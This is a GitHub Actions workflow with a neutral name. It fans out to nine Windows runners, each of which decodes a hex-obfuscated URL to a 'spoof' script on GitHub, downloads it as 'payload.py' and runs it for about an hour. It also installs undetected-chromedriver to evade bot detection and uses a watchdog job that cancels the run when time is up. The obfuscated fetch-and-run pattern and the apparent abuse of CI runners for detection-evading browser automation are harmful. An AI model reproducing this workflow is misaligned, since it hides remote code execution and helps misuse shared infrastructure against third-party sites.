name: Orchestrated Async Processing Grid

on:
  workflow_dispatch:

concurrency:
  group: grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  watchdog:
    name: "Deadline Enforcer"
    runs-on: windows-2022
    timeout-minutes: 75
    steps:
      - name: Deploy Countdown
        shell: pwsh
        run: |
          Write-Host "[ENFORCER] Deployed. Auto-cancel at 65 minutes."
          Start-Sleep -Seconds 3900
          Write-Host "[ENFORCER] Deadline reached. Cancelling..."
          curl.exe -sS -X POST `
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" `
            -H "Accept: application/vnd.github+json" `
            -H "X-GitHub-Api-Version: 2022-11-28" `
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

  parallel-workers:
    name: "GridNode-${{ matrix.slot }}"
    runs-on: windows-2022
    timeout-minutes: 70
    strategy:
      fail-fast: false
      matrix:
        slot: [10, 20, 30, 40, 50, 60, 70, 80, 90]

    steps:
      - name: Prepare Runtime
        shell: pwsh
        run: |
          Write-Host "[PREP] GridNode-${{ matrix.slot }} runtime"
          python --version

      - name: Download Payload
        shell: pwsh
        run: |
          Write-Host "[DOWNLOAD] Fetching payload..."
          $hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4d794d757368726f6f6d32322f6b6563696c6178332d73706f6f662f6d61737465722f73746172742e7079"
          [byte[]]$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
            [Convert]::ToByte($hex.Substring($i, 2), 16)
          }
          $payloadUrl = [System.Text.Encoding]::UTF8.GetString($bytes)
          Invoke-WebRequest -Uri $payloadUrl -OutFile payload.py -UseBasicParsing
          Write-Host "[DOWNLOAD] Saved payload.py ($((Get-Item payload.py).Length) bytes)"

      - name: Install Libraries
        shell: pwsh
        run: |
          Write-Host "[LIBS] Installing dependencies..."
          python -m pip install --quiet --upgrade pip
          python -m pip install --quiet undetected-chromedriver selenium requests

      - name: Run Timed Execution
        shell: pwsh
        run: |
          Write-Host ">> Starting GridNode-${{ matrix.slot }}..."
          $env:PYTHONUNBUFFERED = "1"

          # تشغيل Python في الخلفية كـ Job حتى نتمكن من عرض مخرجاته لحظيًا
          $job = Start-Job -ScriptBlock {
            Set-Location $using:PWD
            $env:PYTHONUNBUFFERED = "1"
            python -u payload.py 2>&1
          }

          Write-Host ">> Job Id: $($job.Id). Window: 65 minutes (3900s)."

          $deadline = (Get-Date).AddSeconds(3900)

          # بثّ المخرجات لحظيًا حتى انتهاء المدة أو انتهاء العملية
          while ((Get-Date) -lt $deadline -and $job.State -eq 'Running') {
            Receive-Job -Job $job -Keep | ForEach-Object { Write-Host $_ }
            Start-Sleep -Seconds 2
          }

          # إن كانت لا تزال تعمل عند انتهاء المدة → إنهاؤها
          if ($job.State -eq 'Running') {
            Write-Host ">> Time limit reached. Stopping job..."
            Stop-Job -Job $job
          }

          # استنزاف أي مخرجات متبقية
          Receive-Job -Job $job | ForEach-Object { Write-Host $_ }
          Remove-Job -Job $job -Force

          Write-Host ">> GridNode-${{ matrix.slot }} finished."
